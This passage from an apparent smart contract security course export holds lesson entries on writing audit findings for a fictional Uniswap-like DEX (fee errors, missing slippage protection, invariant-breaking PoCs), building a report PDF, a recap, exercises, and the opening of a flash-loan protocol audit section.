          Throughout this detailed walkthrough, we're going to focus on the process of identifying issues within code, their potential impact, and proposed solutions.

          But before we dive in, let's address some essential concepts:

          - **Constants**: These are unchanging variables that are quite common within code and should always be treated as such.
          - **Informationals**: These are facts or pieces of data provided in the code intended to be helpful, but if not emitted correctly, they can cause confusion.
          - **Audit comments**: These serve as notes during code reviews, particularly useful when something needs to be addressed later.

          ## Highlighting the Importance of Reporting

          During an audit, it's important to report anything that could potentially refactor the code to improve its overall quality. One simple way is to state "reported" whenever we encounter any issues in the code.

          ## Understanding the Importance of Code Layout

          The code layout plays a crucial role in readability, maintainability, and usability. It is not uncommon to suggest relocating a section of code (such as ‚Äòaudit info‚Äô) that might provide more clarity in another position.

          ## Liquidity Add Misstep

          At one point in our code, we encountered an instance where 'liquidity added' was incorrectly ordered. Missteps such as these could lead to the emission of incorrect data. To provide clarity:

          Liquidity added has parameters out of order.The root cause is the TSWAP pool.The event has parameters out of order, causing the event to emit incorrect information.

          ## Severe Impact Issues

          We found two severe issues during our audit:

          1. **Order of Parameters Issue:**

             In the function `addLiquidityMintAndTransfer`, a liquidity added event is emitted, but the values are logged in the wrong order:

             When the `liquidity added` event is emitted in the `add liquidity mint and transfer` function, it logs values in an incorrect order. The pool tokens to deposit value should go in the third parameter position, whereas the WETH to deposit value should go second.

          2. **Fee Calculation Error:**

             The `getInputAmountBasedOnOutput` function was found to have an incorrect fee calculation, which causes the protocol to take too many tokens from users:

             The `get input amount based on output` function in the TSWAP pool is intended to calculate the amount of tokens a user should deposit given an amount of output tokens. However, the function currently miscalculates the resulting amount when calculating the fee.

          Both of these issues cause a significant detriment to the users and need immediate addressing.

          ## Power of Writing Proof of Codes

          Writing 'proof of codes' is a crucial skill that every auditor should have. It helps not only in proving the existence of issues but also in testing the codebase for other potential vulnerabilities. For example, a 'proof of code' was written for the incorrect fee calculation issue to highlight how much the protocol takes as fees and the actual value.

          ## Impact of Small Code Errors

          Even small errors or inconsistencies in the code can have large implications and result in incorrect information being disseminated. Such was the case with the `Swap exact input` function, where an incorrect return value was always being given(0) irrespective of the actual values.

          In conclusion, auditing requires a keen eye for details, significant knowledge of smart contract coding, and a thorough understanding of possible vulnerabilities. Avoiding magic numbers, maintaining consistency in reporting, and having proficiency in writing 'proof of codes' are all crucial factors to conducting a successful audit.

          We hope that this detailed walkthrough gives you perspective and jumpstarts your journey towards becoming a proficient smart contract auditor!
        description: 'Patrick continues by showing how to report issues with examples and proofs to fix them.'
      -
        id: 13054677-68a6-44cc-aa34-d9eafe463071
        type: new_lesson
        enabled: true
        title: 'Reporting: No Slippage Protection'
        slug: no-slippage-protection
        duration: 8
        video_url: eHewVkWuIUf71ykZTpqwKOSut5pWhRg99KNLcPgokFM
        raw_markdown_url: /routes/security/5-tswap/43-no-slippage-protection/+page.md
        markdown_content: |-
          ---
          title: No Slippage Protection Write up
          ---



          ---

          ## Mitigating Slippage Impact in DeFi Protocols

          The topic for today's post revolves around a crucial aspect of DeFi (Decentralized Finance) transaction executed through protocols like MetaMask. Specifically, we will be focusing on `slippage` and how a lack of protection can adversely affect the user experience.

          ### What is Slippage and why should it concern you?

          In a nutshell, slippage occurs when the execution price of a transaction is different from when the transaction was originally created. This can be due to market volatility causing rapid price changes. High slippage can result in a user receiving fewer tokens than anticipated, or, conversely, paying more than expected for a specified quantity of tokens.

          > If you're new to smart contracts, think of slippage like unwanted change in your transaction, which you'd prefer not to experience.

          Both situations can be distressing for users, and are likely to negatively impact the trust and usability of the protocol.

          ### Why Slippage Protection is Crucial

          From the risk perspective, we'd label this as `High` due to the potential impact. Despite the likelihood being categorized as medium to high, the severity of the potential financial loss warrants its high-risk status.

          An interesting gateway to delve into this topic is through the study of `swap exact input` and `swap exact output` functions in smart contracts and their associated slippage protection measures.

          Take, for example, **TSWAP pool swap exact output** that lacks slippage protection. If market conditions change while a transaction is waiting to be processed, this lack of slippage protection could lead to users receiving far fewer tokens than expected.

          A practical manifestation would be when a user attempts to swap 10 WETH (Wrapped Ether) for DAI (a stablecoin pegged to USD). The user is expecting to get a minimum of 100 DAI, but due to the lack of slippage protection, they might end up receiving less than 100 DAI if the price of WETH depreciates before the transaction is completed.

          ### How to Guard Against Slippage

          A smart contract's code can be revised to include slippage protection. This precaution will ensure that the tolerable maximum or minimum amount is strictly adhered to, despite any sudden market price changes for the involved tokens.

          The way to do this is through implementing a maximum input or minimum output parameter, effectively giving a safety net for users to not receive less or pay more than expected.

          The `maxAmountIn` serves as a limit for how much the user is willing to spend, introducing a safety parameter within the code.

          ### The Importance of a Proof of Concept (POC)

          Having a POC helps a lot when trying to communicate potential risks to a protocol. To illustrate, here's a simple scenario:

          - User initiates a `swapExactOutput` for 1 WETH (WETH=1000 USDC) with input token as USDC and output token as WETH.
          - No maximum input amount allowed, transaction is pending in mempool.
          - Market price of WETH skyrockets to 10,000 USDC.
          - User completes the transaction but is charged 10,000 USDC instead of the expected 1,000 USDC.

          This excessive charge to the user occurs due to no slippage protection. Creating a POC for this scenario will not only help protocol developers understand the implications but also provide a pathway to tackle the problem.

          Having a max input amount parameter ensures that users can predict how much they spend on the protocol.

          ### Wrapping Up

          While some might argue that the user could approve fewer tokens or reject the transaction, the reality is that these aren't foolproof solutions. Protecting against slippage is critical for maintaining user trust and enhancing the protocol's usability.

          Understanding slippage and how it affects your transaction can provide significant benefits and prevent unexpected loss. The control it provides the trader can be the difference between a `successful transaction` and a `bad experience`.

          Although our focus here was on setting it to high, remember that the risk severity of every case varies, and one could always argue **contextual flexibility** based on each unique situation.
        description: 'Slippage Protection Lacking in SwapExactOutput, Add Max Input for Safety. Patrick elaborates with a Proof-Of-Concept Scenario.'
      -
        id: 6705c7ca-1ec8-4953-b7b8-e3e9e13a17f2
        type: new_lesson
        enabled: true
        title: 'Reporting: sellPoolTokens'
        slug: sell-pool-tokens-write-up
        duration: 4
        video_url: b6WPpEmm018lYqnwV7ZOWMjlyqNT3DpLIFuo6awA7jx00
        raw_markdown_url: /routes/security/5-tswap/44-sell-pool-tokens-write-up/+page.md
        markdown_content: |-
          ---
          title: sellPoolTokens write up
          ---



          ---

          # Unraveling Smart Contract Bugs: 'Sell Pool Tokens' Woes

          In the chaotic and fast-paced world of blockchain programming, errors aren't just inconvenient; they can cost money. A lot of money. One notorious mistake often found in the wild is related to token swapping - that is, exchanging tokens within a liquidity pool. Today, we're diving into one high severity bug associated with a `sellPoolTokens` function.

          The nature of this bug means the token swapping feature doesn't operate as expected, causing users to receive an incorrect number of tokens during transactions. Let's delve into this troublesome gaffe further.

          ## What's Going on with 'Sell Pool Tokens'?

          The `sellPoolTokens` function is designed to enable users to efficiently sell pool tokens and receive Wrapped Ether (WETH) in return. Users specify how many pool tokens they're prepared to sell via the `poolTokenAmount` parameter.

          However, this function has a miscalculation issue with the swapped amount, directly linked to the incorrect function call. The current `sellPoolTokens` function calls the `swapExactOutput` function, but it should call `swapExactInput` instead. Why is this a problem? Because users specify the precise input tokens volume, not the output.

          > "Users will swap the wrong amount of tokens, which is a severe disruption of protocol functionality."

          ## Breaking Down the Proof of Concept

          The proof of concept for this takes form in pseudo code, illustrating the botched token swap during a `sellPoolTokens` call. We'd typically piece together a proof-of-code here to further demonstrate this issue practically.

          ## Addressing the Bug: Recommendations for Mitigation

          To tackle this damaging bug, the proposed mitigation strategy is restructuring the implementation to deploy `swapExactInput` instead of `swapExactOutput`. This, however, demands a modification to the `sellPoolTokens` function to accommodate a new parameter dubbed `minWETHtoReceive`.

          But wait, there's more! Area for improvement exists beyond this immediate bug fix. It would be prudent to introduce a deadline to the function as no deadline currently exists. This is a crucial topic for later exploration in the blog series, particularly when we delve into Miner Extractable Value (MEV). For the time being, though, we'll set this to one side.

          The `sellPoolTokens` bug is, rather deceptively, a compelling example of how small errors can disrupt the functionality of decentralized protocols dramatically. By presenting the concept and outlining potential solutions, we hope to contribute to more robust, secure, and user-friendly DeFi platforms.

          Let's keep debugging!
        description: 'Patrick highlights flawed SellPool tokens calculation. Recommends using swapExactInput & adding a MinWethToReceive w/Deadline to prevent exploitation.'
      -
        id: 3bed02c1-41e4-4860-bbe7-ff32160fa6ac
        type: new_lesson
        enabled: true
        title: 'Reporting: Invariant Break & PoC'
        slug: invariant-break-write-up-and-poc
        duration: 9
        video_url: D1S2sYFj00KC00K4crzZ501cig8KZLOBKeH17WMs4zfAUk
        raw_markdown_url: /routes/security/5-tswap/45-invariant-break-write-up-and-poc/+page.md
        markdown_content: |-
          ---
          title: Invariant Break Write up and PoC
          ---



          ---

          # Fuzz Testing: The Key to Proof of Code

          This blog post is going to take you on a journey through the layers of code to uncover the details of proof-of-the-coding process, with an emphasis on fuzz testing.

          ## Fuzz Testing: What it is and why we need it?

          According to the [Software Engineering Institute](https://resources.sei.cmu.edu/asset_files/WhitePaper/2016_019_001_466377.pdf) at the Carnegie Mellon University, fuzz testing (or simply fuzzing) is an automated dynamic testing approach that generates and runs many random inputs to a target program. It's efficient and does a great job at highlighting potential errors, but the use of fuzz tests as proof of code is problematic.

          > "This is because the sequences that they generate can be quite complex and hard to understand - not to mention, they may not necessarily lead to the most efficient code. It can be downright baffling, especially for less experienced developers."

          As a workaround, we need to take the output of the fuzz test and mold it into a more reader-friendly format. The goal here is to convert the fuzz test output into a unit test that clearly illustrates how the protocol should rectify the issue.

          ## Creating a Universal Proof of Code

          Let's illustrate this by trying to rectify a protocol invariant error.

          The fuzz test, in this case, shows that it only takes **ten swaps** to break the invariant. Hence, our next step is creating a **new unit test** to replicate these swaps.

          ## Decoding the Fuzz Test Output

          To better understand the issue at hand, frame a `testInvariantBrokenProof` function based on the fuzz test output.

          Create a sequence of swaps, replicating the fuzz test output. Start with performing only one swap to verify that the code correctly detects a deviation from the norm. Remember to keep verifying the result at each step.

          If all runs smoothly, increase the number of swaps. In this example, we increment it to **nine swaps**.

          ## Reflect, Retest, Report!

          After the completion of your revised unit test, it's time to document the results.

          _"Always start your report with a detailed description of the issue at hand. Explain the root cause, provide a description, and elaborate the impact it can cause. This helps provide a comprehensive understanding of the problem."_

          Once that is complete, present your Proof of Concept, diligently highlighting all steps and intricacies of your solution. By this point, you should have a detailed and well-stated report laid out.

          ## Wrap Up!

          One of the last yet crucial parts of the report is to provide potential mitigation strategies. They could include removing the incentive or keeping it, but accounting for a change in the protocol invariant. Regardless, it is essential to offer actionable recommendations that work best not only at maintaining the protocol's functionality but also at preventing potential breaking of their core invariant.

          By breaking it down into digestible pieces and providing both context and clear instruction, we can transform the cryptic output of fuzz tests into a proof of code that every team member can readily understand.
        description: 'In this video, Patrick explains how to create a unit test that replicates a sequence found using fuzz testing to break an invariant.'
      -
        id: 5b32ca72-ccda-4365-a1b5-59ecfa62371e
        type: new_lesson
        enabled: true
        title: 'Reporting: Weird Erc20'
        slug: writeup-weird-erc20
        duration: 4
        video_url: h2ZqgrKiyVgW28uUdPiNb9mipWOyHfnnrweMBoau4FY
        raw_markdown_url: /routes/security/5-tswap/46-writeup-weird-erc20/+page.md
        markdown_content: |-
          ---
          title: Write up Weird ERC20 You Try This
          ---



          ---

          # Unveiling the Mystery of Tokens while Penning an Audit Report for TSWAP

          Cracking the codes and giving insight into the deep trenches of developmental methods, we're all set to discuss and dig into the topic of tokens. For us, ERC20s proved to be peculiar to work with, challenging some of our pre-established perceptions and notions. We're going to rewind a little and talk about the one crucial aspect we didn't happen to discuss in detail, the token matter.

          ## Unpacked: The Token Hidden Conundrum

          An interesting observation was that we didn't host this test on a TSWAP pool. Let me take you back to our chapter on the TSWAP pool. This episode demonstrated our swap function falling apart, breaking the invariant as an extra transfer was conducted in the process.

          > Blockquote: Diving into this will reveal that the fee-on-transfer tokens echo the same effect, transmitting extra tokens. Remember, when the fee-on-transfer tokens come into play, they pose a threat to the protocol invariance, demanding attention.

          ## Transparency - The Token Assassins

          Here's an interesting fact - in the TSWAP audit GitHub repository associated with this course, we unfolded some significant details.

          ```markdown
          Go to - Audit Data -> README -> Bottom Page
          ```

          This process reveals two audits previously conducted for the Uniswap v1. Further venturing into the Uniswap v1 audit report fashioned by Consensus Diligence, we found several issues with websites and liquidity.

          The v1 of Uniswap suffered a condition where the liquidity pool could be hijacked by certain tokens, for instance, ERC777.

          > Think of these tokens as smoke and mirrors. If these tokens paved the way for reentrancies on the transfer, the liquidity could be drained, leaving us high and dry. The introduction of these strange ERC20s into the original Uniswap v1 caused series of issues for protocols.

          ## The TSWAP Paradox

          What's worth noting is that these confusing ERC20s are a significant issue in DFI. They can be a handful to work with due to their distinct characteristics. It might seem enticing if they were all similar, but alas, that's not the case. This issue tends to pop up often, particularly in competitive audits, as many protocols are oblivious to this aspect.

          ## Drafting the Audit Report

          In our discoveries, our conclusive medium (not fully penned down) anticipates additional exploration and experimentation from you. Accept the challenge and bask in the experience of creating proof codes and get playful with the process.

          Surprisingly, you'll come across these familiar ERC20s repeatedly. It almost feels as though they're playing peekaboo, secretly popping out at the most unexpected times.

          ## Conclusion

          There's a great deal of satisfaction in unlayering these complexities and jotting down findings. The ordeal of wielding together an audit report surprisingly paves the way to add more to our developmental platter. The report initiates the process of understanding and recognising the challenges and solutions in protocol handling, making the world of tokens and audits a little less complicated and a lot more intriguing.
        description: 'Uniswap V1, TSWAP pool issues, breaks protocol invariance. Explore, and report weird ERC20s, DeFi vulnerabilities.'
      -
        id: fdca1d04-2481-4cbb-8657-27747fa56f3d
        type: new_lesson
        enabled: true
        title: 'Creating Pdf For Your Portfolio'
        slug: creating-pdf-for-your-portfolio
        duration: 4
        video_url: z2O5AahTaDsqpOBVWwiPJgwJK6Znza5wzsGZbLl1rRU
        raw_markdown_url: /routes/security/5-tswap/47-creating-pdf-for-your-portfolio/+page.md
        markdown_content: |-
          ---
          title: Creating the PDF for your Portfolio
          ---



          ---

          # Building an Audit Report: A Step by Step Tutorial

          Becoming proficient in creating an audit report involves mastering certain techniques. Throughout this post, you'll learn how to create an audit report tailored to your unique needs using available resources and Markdown tools.

          ![](https://cdn.videotap.com/y8C5WoYeGfIBalrcsQSJ-11.25.png)

          ## Step 1: Importing Files

          Before we venture any further, we must first import the files we need. For instance, we've previously used a logo PDF file in our audit data folder, which you can easily repeat. Scope out your directories for relevant files before you start crafting your report.

          ## Step 2: Leveraging the Audit Report Template

          Don't start creating your report from scratch! Utilize available templates to help guide you in building an informative and detailed review. You can find a well-crafted audit report template on our course page. To get the template, go back to the course, scroll upwards until you come across the template.

          Simply copy the content from the raw version of the template and paste it into your new file called 'Report Template MD'.

          ## Step 3: Tailoring the Report

          Having a template is splendid, but personalizing it to suit your audit changes the game. Let's rename the report template to '2020 311 one' and let's call it 'TSWAP audit MD'.

          Feel free to insert the findings of your audit into the document. Let's add findings, a summary of the issues discovered and any recommendations you may have under the sections provided in the template.

          > _Remember your findings should be as descriptive and detailed as possible to provide the most value._

          To enhance your portfolio even further, spend some time writing up explanatory notes and if you had collaboration during the audit process, feel free to add their findings as well.

          ## Step 4: Updating the Details

          Taking the time to update information accordingly is definitely vital. You might need to add audit details, scope, and list the issues you encountered. To visualize some parts of your report, say the risk classifications, you can include charts. Simply grab any chart you find illustrative enough and paste it into the report.

          For example, you can provide the severity level of the identified issues found during your audit. We're going to say we found four high-risk issues, two of medium risk, and two of low risk. Informational issues can be many.

          ## Step 5: Finalizing and Converting the Report

          Having updated the details, now is the perfect time to finalize your report. Set the report title, include your name(s), add protocol summary, risk classification, and audit scope details.

          To convert the markdown file into a professional-looking PDF document, we can use [pandoc](https://pandoc.org/getting-started.html), a very useful document converter.

          And voila! Your PDF audit report is generated and ready for presentation, filled with detailed findings and code snippets.

          ![](https://cdn.videotap.com/gTjSzByU5kxK3CrXUbph-174.38.png)

          ## Step 6: Displaying Your Report

          With the diligent work done, it's time to share your accomplishment to the world. Update your GitHub with the audit report or include a new report in your portfolio. Constantly creating and adding audit reports boosts your portfolio and betters your skills.

          A job well done! By completing this tutorial, you've learnt to create a detailed, personalized audit report. Incredibly, through conducting audits, you've also gained substantive knowledge of DeFi protocols.

          Remarkably, as we go through smart contracts- like the T-swap contract, a variation of Uniswap, you also gain substantial understanding of decentralized exchanges at the fundamental level.

          Taking on real-world tutorials like these not only equip you with practical auditing skills but also provide you with a strong foundation in the fast-growing field of Decentralised Finance (DeFi).

          > "We're not just teaching you how to conduct audits. We're also teaching you DeFi along the way. Very sneaky, aren't we?"
        description: 'Creating a PDF of your audit report to add to your GitHub portfolio! Show case your achievements!'
      -
        id: 64901db8-395b-4ac7-a32c-a884c6189d02
        type: new_lesson
        enabled: true
        title: Recap
        slug: recap
        duration: 8
        video_url: OPWMnJ6eyRrsMexylCRIaU4900uXYDjn6EogptmHQ5Zc
        raw_markdown_url: /routes/security/5-tswap/48-recap/+page.md
        markdown_content: |-
          ---
          title: Recap
          ---



          ---

          # DeFi Security Auditing ‚Äì A Recap

          Hey there! If you've been with us from the start of our series on DeFi Security Auditing, congratulations on reaching this point! This is going to be a recap encompassing everything you've learned so far in the course. In case you missed out on something, don‚Äôt worry, let's walk through them again.

          ## Protocol Invariants ‚Äì Your Secret Weapon

          First and foremost, we realized that understanding protocol invariants is crucial in locating bugs hidden in our code bases. We don‚Äôt even need to explore the code base deeply or conduct a tedious manual review. We found how we can write an invariant or a stateful fuzzing test suite, which pointed out a bug in the swap function ‚Äì a process without any manual review.

          In essence, the tooling, particularly stateful fuzzing, is a powerful mechanism for bug detection.

          ## Unfolding the AMM Mystery

          We touched upon the underlying fundamentals of an AMM, or Automated Market Maker, and what a DEX (Decentralised Exchange). Even though the T-Swap audit revolves around a fictitious protocol, its foundation is based on Uniswap and follows exactly the same X times Y equals K principle.

          We learned that the AMM works without an order book. It simply uses token pools, and to extract tokens from one side, tokens need to be added to the other side, maintaining the balance. Everyone is on the lookout for a platform where every swap transaction means money in their purses.

          ## Understanding the Uniswap Protocol

          Boiling down the core mechanisms of the Uniswap protocol, X multiplied by Y equals K is the mathematical model where K is a constant, ensuring the token ratio remains unchanged. Every time you wish to take a token, you need to provide an equivalent amount back.

          Dealing with a protocol like an AMM where math is the crux of the system, the importance of invariants is highlighted.

          ## Identifying Client Requirements

          Earlier, the absence of illustrative graphs and even the lacking of documentation for some functions made working somewhat daunting. But over time, we've learned that we need to function hand-in-hand with the protocol. They always have the inside story, and understanding their needs is indispensable.

          Our comprehensive client onboarding document illustrates this point, particularly the section about T-SWAP having onboarded. We learned that onboarding our protocols and obtaining as much information as possible is of utmost importance.

          A case in point would be their low test coverage, an issue we'd definitely want them to address. They churn out multiple ERC20s. And if you don't know by now, ERC20s are pretty wacky. Understanding this helps to architecturally protect the protocol from the peculiarities of these ERC20s.

          We also learned that it's not advisable to work with any and every ERC20. Instead, a restriction list or documentation indicating potentially problematic tokens (like rebasing tokens, fiat transfer tokens, reentrancy tokens) is a good practice. Hence, an extensive onboarding document and deep client interaction can take you a long way.

          ## Keeping Invariants in Check

          Our journey took us through understanding what protocol invariants are ‚Äì they represent those attributes of the system that must always remain constant. We learned to write fuzzing or stable fuzzing tests to go hand in hand with them.

          Referencing the Freepy model where protocol invariant checks are directly embedded into the system, Uniswap stands as a good example of such a system. In stark contrast was the Euler finance attack, where the absence of an invariant check led to their exploit. But people do differ on nomenclature, some prefer to call it CEI and pre and post-checks.

          ## Diving into DeFi

          The constant product formula X \* Y = K, oft-used in many DeFi protocols, particularly AMMs, is a powerful tool. For more adventurous explorations into the realm of DeFi, DeFi Llama is a great resource.

          Having said that, we were also introduced to other beneficial tools like stateful and stateless fuzzing, Echidna consensus, and other fuzzers. Although mutation or differential testing didn't make it onto the list, they're definitely on the cards for future lessons.

          ## Deciphering Solidit

          Solidit presented itself enormously useful, allowing us to cross-check if an issue has been previously pointed out by someone else. It helps us to learn about new findings and also verify if we're on the right track.

          ## Welcome to A World Of Weirdness

          No, we're not stepping into a horror movie. Welcome to the world of ERC20s, where weird is the new normal, and this trend doesn't seem to be fading. But not to worry ‚Äì Trail of Bits has provided a handy checklist to make sure you're making the right choices. There's also a master list naming all the weird ERC20 tokens ‚Äì a post-apocalyptic catalog if you'd wish to call it so.

          ## Concluding Thoughts

          If you‚Äôve accompanied us this far, give yourself a round of applause. It's remarkable progress considering the level of understanding you now hold. You've essentially audited the Uniswap codebase and are now fully equipped to delve into the world of security, undertake competitive audits, bug bounties, or even get hired!

          Nevertheless, we recommend you complete the course to further enrich your learning. Pat yourself on the back for your achievement, take a well-deserved break, and get ready to tackle some challenges ahead.
        description: 'Recap things covered in this section. Common issues in DeFi: liquidity, price manipulation, governance attacks.'
      -
        id: 2183b4e7-d6f9-4d3b-ba24-179fa1df2c95
        type: new_lesson
        enabled: true
        title: Exercises
        slug: exercises
        duration: 3
        video_url: v01JVS2ZF5X00q89OsRxM9dIqqnwn00rLiWtr2wg02S136A
        raw_markdown_url: /routes/security/5-tswap/49-exercises/+page.md
        markdown_content: |-
          ---
          title: Exercises
          ---



          ---

          # Exciting Dive into Smart Contract Fuzz Testing and Learning Techniques

          ### Exploring Tint's Code Error

          The other day, Tint was kind enough to share a fascinating gist that truly piqued my interest. It contained a small snippet of a code base that had one glaring issue. Of course, it was not just the issue itself that caught my attention, but more so what this issue represented - an exciting opportunity to start honing your smart contract fuzzing skills with Foundry.

          ![](https://cdn.videotap.com/cVgMHZy43EUCFjsPdVYm-15.24.png)

          The scenario offered by this code base is straightforward. It features a registry contract that permits callers to register by paying a predetermined fee in ETH. If the caller sends too little ETH, the execution reverts. However, if they send too much ETH, the contract obliges by returning the extra funds.

          Looking at the unit test reports, everything seems perfect- right? But hold your horses; there's a twist. Your challenge is to write at least one fuzz test via the registering contract. This fuzz test must correspond to the brief specification above and capable of detecting a bug in the register function.

          Always remember to undertake this task before moving ahead. Why? Because it can remarkably hone your fuzz test writing skills.

          ### Amplify Learning with Social Media

          Amidst this coding, let's spice things up with a tad bit of tweeting. Don't be confused, it's a part of the process. Remember, as a security researcher (focus on the 'researcher'), you aim to excel at researching and comprehending issues. Go forth, dive into Solidity and learn something unique.

          You can start with something as straightforward as reentrancy. As a topic we've repeatedly discussed and will continue to, there's a wealth of knowledge to be extracted. Find examples of different reentrancy attacks- perhaps the highs. Choose a crazy reentrancy attack, learn about it, break it down and share your learning on Twitter.

          > _"One of the best ways to learn is something called the TeachBack Method, where if you teach something back to somebody, that is a great way to learn."_

          ### Take a breather

          Now seems like an excellent time to grab a cup of coffee and unwind for a bit.

          If you haven't yet signed up for [codehawks](https://codehawks.com), now's the time! We have exceptional first flights lined up that will give you the confidence boost you need.

          ![](https://cdn.videotap.com/08R5XEP6FtKgKciMJKrm-101.6.png)

          ### Coming up next...

          Brace yourself for Section Six with Centralization Proxies and Oracles featuring the intimidating Thunder loan audit. We will also cover Boss Bridge before moving on to tackling the Vault Guardians Boss codebase.

          So, gear up, recharge your brains with a coffee break, and let's dive into the world of smart contracts!

          See you soon folks.
        description: 'Learn smart contract security testing by coding a fuzz test, discover reentrancy attacks, share insights on Twitter. Upcoming sections explained.'
    type: new_section
    enabled: true
  -
    id: Fh1I3Ylc
    title: 'Thunder Loan'
    slug: thunder-loan
    lessons:
      -
        id: 9666c162-de47-4243-b6b9-cf754d78d588
        type: new_lesson
        enabled: true
        title: Introduction
        slug: introduction
        duration: 6
        video_url: zWgkMEoGiBV9K02UTK67D7AOzef9X8dKVwf01H6f5zyog
        raw_markdown_url: /routes/security/6-thunder-loan/1-introduction/+page.md
        markdown_content: |-
          ---
          title: Introduction
          ---



          ---

          # Deep Dive into Security Testing with the Thunder Loan Audit

          Welcome back to your favorite security course repository! I trust you've spent some time on that fuzzing exercise because this lesson is going to be a _real deep dive_ into security testing. We've already learned tons of tools and skills, and now it's time to really apply and hone those skills as we dig into _Section Six: Thunder Loan Audit._

          ## The Context: Thunder Loan Protocol

          Let's begin by git-cloning this lesson's code fro Github.

          ![](https://cdn.videotap.com/iLoskdCcOE28WEUkiXTF-68.76.png)

          This richly detailed protocol we'll be auditing has a fantastic logo - a frog with a thunder bolt on its chest standing over a pile of money. However, beneath this cool exterior, there lies a multitude of bugs waiting to be smoked out. This protocol also gives us a detailed experience of two of the most important DeFi protocols in the world, _Aave and Compound_, as it's majorly based on these.

          ## DeFi, Borrowing, and Lending

          These protocols are the crux of DeFi borrowing and lending, a fundamental financial concept in the DeFi universe. Whilst auditing the Thunder Loan protocol, we'll naturally delve a bit into understanding Aave and Compound.

          ## Pricing Information and Oracles

          We had a touch on this in the Puppy Raffle exercise. However, here we delve deep into the significance of sourcing accurate pricing information for assets and how to ace this process effectively as we interact with Oracles.

          > "A lot of people use \[upgradable contracts\]. We need to know how to keep them secure."

          ## Upgradable Contracts

          For the first time, we'll be interfacing with an upgradable contract, a common feature in the wild world of Web 3. Now, whether or not these contracts are optimum is up for debate, but their usage is indeed undeniable.

          ## Multifaceted Proxies

          We are not going to be delving deep into the multifaceted proxy, also known as _the diamond standard_, but we're definitely going to talk a bit about its functionalities and distinctive features.

          ![](https://cdn.videotap.com/bnzGy4zQOk9RwQjEXVOh-189.08.png)

          Moreover, we'll be learning about another brilliant tool called the **Upgrade Hub**. This tool comes in handy for discerning which contracts have been upgraded and which upgrades might be construed as rug pulls. By inserting a contract address, you'll be able to view its complete upgrade history, appearing similarly to git diffs.

          > "Upgrades are highly sensitive in the Web 3 world. This \[Upgrade Hub\] is a great place to learn about and work with proxies and view their history."

          ## Centralization and Defi Security Audits

          Our previous interactions with the T-SWAP or Uniswap audit only scratched the surface, introducing us to DEXes, invariants, and important DeFi protocols. With Thunder Loan, we‚Äôre moving to a new level.

          This protocol‚Äôs code base has many common DeFi bugs, which make this one of the most important audits you can learn from. In addition to these security flaws, it introduces the concept of flash loans‚Äîa "monster" tool with an enormous amount of information to explore.

          By the time you've audited this code base, which consists of multiple folders and contracts and guides you through a more advanced protocol, you'll significantly enhance your understanding of DeFi security audits.

          ## Price Oracle Manipulations

          According to the curriculum, price oracle manipulation was the principal attack for the first half of 2023. So as we audit the Thunder Loan protocol, we'll be learning how to tackle this risk head-on.

          > "This course provides an extensive and comprehensive walk-through of the protocol that‚Äôs packed with so many common DeFi bugs that you will learn plenty along the way.‚Äù

          To wrap it up, the full report and notes on how to generate the audit report are waiting in the Thunder Loan git repo‚Äôs `audit-data` branch as usual. Brace yourself and get ready to unearth a treasure trove of bugs and become a better security tester while we audit the Thunder Loan protocol!
        description: 'Introducing the Thunder Loan protocol, based off Aave/Compound. Section covers borrowing and lending, pricing information, and upgradeable contracts.'
      -
        id: c4bd6e67-622f-4978-81ab-b6a6b8415676
        type: new_lesson
        enabled: true
        title: 'Phase 1: Scoping'
        slug: phase-1-scoping
        duration: 4
        video_url: u91px009roNkxQdo6qtN4GOaDslvZl02CZHLP2KRYNpHs
        raw_markdown_url: /routes/security/6-thunder-loan/2-phase-1-scoping/+page.md
        markdown_content: |-
          ---
          title: Phase 1: Scoping
          ---

          _Follow along with the video lesson:_



          ---

          # Scoping out a Codebase: A Comprehensive Guide

          Code auditing is a crucial part of every developer's journey. Whether you're managing an open-source project or conducting a security review, understanding a codebase in and out is indispensable. So where do we start?

          Well, this guide promises to take you through the nitty-gritty of scoping out a codebase, using a protocol as an example.

          ## Kicking Things off With the README

          The README documentation serves as a good starting point when familiarizing yourself with a new protocol. While initial impressions might provoke a 'blah, blah, blah, whatever' response, we can extract valuable information about the audit scope details in this document.

          In our case, the README delineates the commit hash details, which you'd typically implement via the `git checkout` command.

          ```bash
          git checkout [paste the commit hash here]
          ```

          For learning purposes, however, we're going to stick with the main branch.

          ## Understanding Included Contracts

          Your next port of call should be examining the contracts embedded within the codebase. In our scenario, we noticed all contracts resided in the protocol source, particularly in the `interface for protocol`. Interestingly, we also saw an upgraded version of the protocol.

          This raised a question mark‚Äîwhat defines this 'upgraded protocol'? The particulars will unravel as we progress.

          ## Code Version

          Pay attention to the Solidity version for the protocol‚Äîours was v0.8.20. Be mindful that the contract should match Ethereum's latest security standards.

          ## Contracts Handled

          We next located some ERC 20 contracts‚Äînamely USDC, die, Link, West. Use your past knowledge to understand how these contracts work. From our last course, we discovered that the USDC supports an upgradable contract and encompasses a block and allow list.

          > "This information is vital as we need to understand how our protocol manages a token, which can transform completely."

          ## Identifying Roles

          We identified different roles within the protocol including an owner, a liquidity provider, and a user. Hoodwinked by terms like "liquidity provider"? Don't fret! As you delve deeper into DeFi, you will acquire familiarity with this lexicon.

          In our case, we discovered that a liquidity provider is someone who deposits assets to earn interest, while a user is someone who takes flash loans from the protocol.

          The protocol's owner holds the power to update the implementation‚Äîinteresting.

          ### Digging Out Known Issues

          We also found some known issues detailed in the README, warranting a revisit after gaining more context.

          ## Analyzing Makefile

          Potentially useful insights lay in the `Makefile`, where we found Slither configuration along with some other tools. We took a minute to run solidity metrics on this "bad Larry", yielding an output that adds value to our understanding.

          ```bash
          solidity-metrics [insert codebase here]
          ```

          In our audit, the API gave an output of 391 N slock and 327 complexity score, indicating most complexity resided in the `Thunderloan` and `Thunderloan-upgraded`.

          We dropped these metrics into a markdown file as notes to help gauge process duration in future audits.

          ## The Importance of Context and Reconnaissance

          Ending phase one of our audit process, it's clear that understanding an unknown codebase‚Äîand by extension, performing a protocol audit‚Äîis a matter of patience and practice. Taking your time and being methodical can help you glean valuable contextual information about the codebase.

          In the part two of this guide, we'll conduct some rigorous reconnaissance, promising further insights into the protocol audit process. Stay tuned!
        description: 'Patrick dives into the scoping phase of Thunder Loan. Known issues found in the code base are discussed.'
      -
        id: 06bc8d6e-5b70-4b7e-b650-01ee9c4d791a
        type: new_lesson
        enabled: true
        title: 'Reading The Docs'
        slug: reading-the-docs
        duration: 4
        video_url: L00fSQwGicEQySCtH3D2IZKKr33RuAddtg1HSkTmUiXE
        raw_markdown_url: /routes/security/6-thunder-loan/3-reading-the-docs/+page.md
        markdown_content: |-
          ---
